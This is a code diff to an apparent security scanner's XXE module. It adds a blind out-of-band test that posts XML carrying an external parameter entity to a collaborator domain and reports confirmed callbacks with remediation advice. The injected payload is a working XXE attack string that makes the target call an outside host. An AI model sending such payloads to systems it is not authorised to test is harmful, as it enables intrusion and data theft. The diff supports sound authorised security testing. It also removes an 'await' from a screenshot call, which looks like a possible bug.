@@ -71,6 +71,9 @@ class XxeScanner(BaseModule):
         tasks = [self._test_xxe(ep, target, sem) for ep in endpoints]
         await asyncio.gather(*tasks, return_exceptions=True)
 
+        # Blind OOB XXE via ForgeCollab (Pillar 17B)
+        await self._test_blind_xxe_oob(endpoints[:5], target)
+
         return self._make_result(start)
 
     async def _find_xml_endpoints(self, target: str) -> list[dict]:
@@ -148,7 +151,7 @@ class XxeScanner(BaseModule):
                             response_raw=body[:2000],
                             extra={"url": url, "payload": description},
                         )
-                        ev.screenshot_path = await self.capture_screenshot(
+                        ev.screenshot_path = self.capture_screenshot(
                             url, finding_id=f"xxe_{url.replace('https://','').replace('/','_')}"
                         )
                         self.new_finding(
@@ -231,6 +234,98 @@ class XxeScanner(BaseModule):
 
                 except Exception as exc:
                     self.log.debug("XXE test failed on %s: %s", url, exc)
+
+
+    async def _test_blind_xxe_oob(
+        self, endpoints: list[dict], base_target: str
+    ) -> None:
+        """Test for blind XXE using ForgeCollab OOB DNS/HTTP callbacks (Pillar 17B).
+
+        Injects a parameter entity that triggers an external DNS lookup
+        to the ForgeCollab domain. OOB callback = confirmed blind XXE.
+        """
+        try:
+            from forge_collab.server import CollabClient
+        except ImportError:
+            return
+
+        collab_domain = self.config.extra.get("collab_domain", "")
+        if not collab_domain:
+            import os
+            collab_domain = os.environ.get("FORGE_COLLAB_DOMAIN", "")
+        if not collab_domain:
+            return
+
+        collab = CollabClient(domain=collab_domain)
+
+        for ep in endpoints:
+            url = ep.get("url", ep.get("action", ""))
+            if not url:
+                continue
+
+            await self.rate_limit()
+            try:
+                token = collab.register("xxe_scanner", "blind_xxe", url, "xml_body")
+                oob_url = collab.build_url(token)
+                oob_dns = collab.build_dns_payload(token)
+
+                # Parameter entity OOB payload
+                xxe_payload = (
+                    f'<?xml version="1.0"?><!DOCTYPE root ['
+                    f'<!ENTITY % forge SYSTEM "http://{oob_dns}/forge.dtd">'
+                    f'%forge;]><root>test</root>'
+                )
+
+                import aiohttp
+                async with aiohttp.ClientSession(
+                    connector=aiohttp.TCPConnector(ssl=False)
+                ) as session:
+                    async with session.post(
+                        url,
+                        data=xxe_payload.encode(),
+                        headers={"Content-Type": "application/xml"},
+                        timeout=aiohttp.ClientTimeout(total=10),
+                    ) as resp:
+                        await resp.read()
+
+                got_cb = await collab.wait_for_callback(token, timeout=8.0)
+                if got_cb:
+                    ev = Evidence(
+                        request_raw=f"POST {url}\nContent-Type: application/xml\n\n{xxe_payload}",
+                        response_raw=f"ForgeCollab OOB DNS/HTTP callback for token {token[:8]}",
+                        extra={"oob_url": oob_url, "oob_dns": oob_dns, "token": token},
+                    )
+                    self.new_finding(
+                        title="Blind XXE (OOB DNS Confirmed)",
+                        severity=Severity.HIGH,
+                        description=(
+                            "Blind XXE confirmed via ForgeCollab OOB DNS callback. "
+                            "The XML parser resolved an external parameter entity, "
+                            "triggering a DNS lookup to Forge Collaborator infrastructure. "
+                            "Can be chained to SSRF, file read, and data exfiltration."
+                        ),
+                        reproduction_steps=[
+                            f"1. POST {url}",
+                            "2. Content-Type: application/xml",
+                            f"3. Payload: {xxe_payload[:120]}...",
+                            f"4. ForgeCollab DNS callback for {token[:8]}",
+                        ],
+                        remediation=(
+                            "Disable external entity processing in the XML parser. "
+                            "For Java: XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES = false. "
+                            "For PHP: libxml_disable_entity_loader(true). "
+                            "Use allow-listed DTDs or disable DTD processing entirely."
+                        ),
+                        references=["CWE-611", "OWASP A03:2021"],
+                        evidence=ev,
+                        cvss_v31_vector=CVSS_XXE,
+                        cvss_v40_vector=CVSS40_XXE,
+                        mitre_attack=["TA0001/T1190"],
+                        target=base_target,
+                        url=url,
+                    )
+            except Exception as exc:
+                self.log.debug("OOB XXE test error (%s): %s", url, exc)
 
 
 class TestXxeScanner:
